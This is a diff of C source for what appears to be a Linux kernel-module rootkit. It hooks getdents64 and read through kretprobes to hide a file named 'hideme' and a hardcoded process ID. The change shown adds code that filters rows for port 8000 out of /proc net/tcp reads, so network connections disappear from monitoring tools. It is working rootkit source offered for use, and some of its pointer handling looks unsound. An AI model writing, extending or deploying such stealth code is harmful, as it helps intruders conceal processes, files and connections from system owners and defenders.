@@ -15,8 +15,7 @@
 
 /// const file name to hide
 const char* hide_file_name = "hideme";
-const pid_t hide_pid = 3789;
-const char* hide_pid_path = "/3789/fd";
+const pid_t hide_pid = 3015;
 
 
 typedef bool (*entry_filter_t)(struct linux_dirent64*, void* data);
@@ -30,6 +29,7 @@ static unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t
 
 static unsigned long remove_entry(void* buffer, unsigned int buffer_size, int entry_offset, int entry_size);
 
+static int ends_with(const char *str, const char *suffix);
 
 struct getdent64_arguments {
     unsigned int fd;
@@ -145,14 +145,67 @@ static int read_handle_return(struct kretprobe_instance *ri, struct pt_regs *reg
 //    pr_info("unlocking..\n");
     read_unlock(&tasklist_lock);
 
-    pr_info("read (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
-    pr_info("path=%s, sb=%s, name=%s, open_fds=%ld\n", path, sb->s_id, process_to_hide->comm, open_fds);
+    // pr_info("read (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
+    // pr_info("path=%s, sb=%s, name=%s, open_fds=%ld\n", path, sb->s_id, process_to_hide->comm, open_fds);
 
 
     if(strcmp(sb->s_id, "proc") == 0){
-        if(strcmp(path, "/net/tcp") == 0){
-            pr_info("read (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
-            pr_info("path=%s, sb=%s, name=%s, open_fds=%ld\n", path, sb->s_id, process_to_hide->comm, open_fds);
+        if(ends_with(path, "/net/tcp")){
+            char* buffer = kzalloc(args->count, GFP_KERNEL);
+
+            char* buffer_ptr = buffer;
+
+            int index = -1;
+            unsigned long address = -1;
+            unsigned short port = -1;
+
+
+            char* row_start = args->buffer_ptr;
+            for(int row = 0; *row_start != '\0' ; row++){
+                pr_info("Row Index %d\n", row);
+
+                int row_length = 0;
+
+                // go to end of line
+                while(*(row_start + row_length) != '\n') ++row_length;
+                // skip \n
+                ++row_length;
+
+                pr_info("Row Len: %d\n", row_length);
+
+                if(row == 0){
+                    // first-row copy
+                    strncpy(buffer_ptr, row_start, row_length);
+                } else {
+                    int result = sscanf(row_start, "%d: %lX:%hX", &index, &address, &port);
+                    
+                    if(result == 3){
+                        // in regular row
+                        if(port != 8000){
+                            pr_info("Coping index %d address %X port %d\n", index, address, port);
+                            strncpy(buffer_ptr, row_start, row_length);
+                        }  else{
+                            pr_info("Filtering index %d address %X port %d\n", index, address, port);
+                        }      
+                    } else{
+                        pr_warn("Cant Parse line \n");
+                    }
+                }
+
+                buffer_ptr += row_length;
+                row_start += row_length;
+            }            
+
+
+            
+            //pr_info("cybering read(fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
+            //pr_info("path=%s, sb=%s, name=%s, open_fds=%ld\n", path, sb->s_id, process_to_hide->comm, open_fds);
+            pr_info("size=%ld, content= %s\n",args->count , args->buffer_ptr);
+
+            strncpy(args->buffer_ptr, buffer, args->count);
+            pr_info("new_content= %s\n", buffer);
+
+            kfree(buffer);
         }
     }
 //
@@ -264,3 +317,11 @@ unsigned long remove_entry(void* buffer, unsigned int buffer_size, int entry_off
         return count;
     }
 }
+
+int ends_with(const char *str, const char *suffix) {
+    size_t str_len = strlen(str);
+    size_t suffix_len = strlen(suffix);
+  
+    return (str_len >= suffix_len) &&
+           (strncmp(str + str_len - suffix_len, suffix, suffix_len) == 0);
+  }
